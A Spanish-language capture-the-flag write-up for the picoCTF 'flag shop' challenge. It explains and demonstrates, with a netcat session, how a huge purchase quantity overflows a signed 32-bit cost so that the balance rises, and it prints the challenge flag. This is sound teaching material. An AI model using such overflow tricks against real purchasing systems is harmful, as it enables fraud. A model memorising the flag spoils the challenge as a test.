There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/253c4651d852ac6342752ff222cf2a83/store.c). Connect with `nc jupiter.challenges.picoctf.org 9745`.

Hints:
1. Two's compliment can do some weird things when numbers get really big!

## Solución 1:
De acuerdo a la pista revisamos el código de la tienda, el cual nos indica que los valores se guardan en  int's, lo cual en lenguaje C es equivalente a 32 bits, investigando encontré que esto se puede afectar al hacer que el valor agregado sea mayor al posible que pueden guardar, haciendo que el bit reservado para el signo pueda ser cambiado, por lo tanto al comprar una cantidad grande de banderas de costo 900, podemos hacer que el costo total sea negativo, lo cual en lugar de restar al balance, sumara una gran cantidad de créditos suficientes para comprar la flag verdadera.

El valor máximo que se puede almacenar en 32 bits es 2147483647, al dividir este valor en 900 que es el valor de una flag falsa, nos da como resultado 2,386,092.941, si queremos afectar el bit del signo, hay que ingresar un valor significativamente mayor para eso, yo lo hice con 2,386,100 lo cual fue suficiente y con esto obtengo creditos suficientes:
```
┌──(kali㉿kali)-[~/Documents/GS]
└─$ nc jupiter.challenges.picoctf.org 9745
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386100

The final cost is: -2147477296

Your current balance after transaction: 2147478396

Welcome to the flag exchange
We sell flags
```
Ahora, con los créditos suficientes, simplemente compro la flag real:
```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_65d67a74}
```